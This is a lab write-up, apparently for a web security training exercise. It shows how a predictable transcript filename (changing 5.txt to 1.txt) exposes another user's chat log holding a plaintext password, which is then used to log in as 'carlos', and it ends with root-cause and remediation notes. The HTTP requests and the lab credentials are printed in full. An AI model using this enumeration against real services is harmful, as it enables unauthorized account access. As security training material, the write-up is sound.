# Insecure Direct Object References

## Description

This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

Solve the lab by finding the password for the user `carlos`, and logging into their account.

## Solution

### Step 1: Explore the live chat feature

I accessed the lab, which offered a `Live chat` option. Clicking it opened a chat interface where messages were exchanged with a bot named `Hal Pline`.

The chat submitted transcripts to the server via:

```http
POST /download-transcript HTTP/2
Host: 0a1300690365359b80f7124f0027008b.web-security-academy.net
Cookie: session=1WWzMtsAz8WMJrQRLWMBLmoS7ipiHcUm
Content-Length: 349
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Dnt: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye5aytcQ8EkxFJbPm
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0a1300690365359b80f7124f0027008b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1300690365359b80f7124f0027008b.web-security-academy.net/chat
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

------WebKitFormBoundarye5aytcQ8EkxFJbPm
Content-Disposition: form-data; name="transcript"

You: Hello<br/>Hal Pline: I don't know everything, ask me another.<br/>You: ok<br/>Hal Pline: Could you spell that please? I think you're making up words again<br/>CONNECTED: -- Now chatting with Hal Pline --
------WebKitFormBoundarye5aytcQ8EkxFJbPm--
```

### Step 2: Download the transcript

The chat also offered an option to download the transcript, which issued the following request:

```http
GET /download-transcript/5.txt HTTP/2
Host: 0a1300690365359b80f7124f0027008b.web-security-academy.net
Cookie: session=1WWzMtsAz8WMJrQRLWMBLmoS7ipiHcUm
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0a1300690365359b80f7124f0027008b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1300690365359b80f7124f0027008b.web-security-academy.net/download-transcript
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i
```

Response:

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="5.txt"
X-Frame-Options: SAMEORIGIN
Content-Length: 208

You: Hello<br/>Hal Pline: I don't know everything, ask me another.<br/>You: ok<br/>Hal Pline: Could you spell that please? I think you're making up words again<br/>CONNECTED: -- Now chatting with Hal Pline --
```

The transcript was retrieved using a simple, sequential filename (`5.txt`), with no check confirming the file belonged to the requesting user's own session.

### Step 3: Enumerate other transcripts

Since the file was referenced by a predictable, static filename rather than any value tied to the current session, I changed the filename from `5.txt` to `1.txt`:

```
GET /download-transcript/1.txt
```

Response:

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="1.txt"
Set-Cookie: session=jSYYnTkNKRFzJtjkg4hTP5NjguZbk30y; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 520

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is 7bk6h2hj1zzd9m0vpdca. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

This transcript belonged to another user, `carlos`, and contained his password in plaintext: `7bk6h2hj1zzd9m0vpdca`, entered while chatting with the bot in an attempt to confirm it.

### Step 4: Log in as carlos

I logged in using the disclosed credentials:

```
carlos : 7bk6h2hj1zzd9m0vpdca
```

Logging in successfully solved the lab.

## Root Cause

Chat transcripts are stored on the server's file system and served using sequential, predictable filenames (`1.txt`, `2.txt`, `5.txt`, and so on), with no authorization check verifying that the requesting user's session owns the requested transcript. This is a classic insecure direct object reference (IDOR): any authenticated user can enumerate and retrieve any other user's transcript simply by guessing or incrementing the filename, exposing whatever sensitive information users may have typed into the chat, including passwords entered while attempting to verify them.

## Remediation

- Do not expose internal, sequential, or otherwise predictable identifiers as the sole means of accessing user-specific resources.
- Enforce server-side authorization checks that verify the requesting user's session is permitted to access the specific resource being requested, rather than trusting the filename or identifier alone.
- Avoid designing chat or support flows in which users are ever prompted or incentivized to type their password into a message, since it may be logged, stored, or otherwise exposed.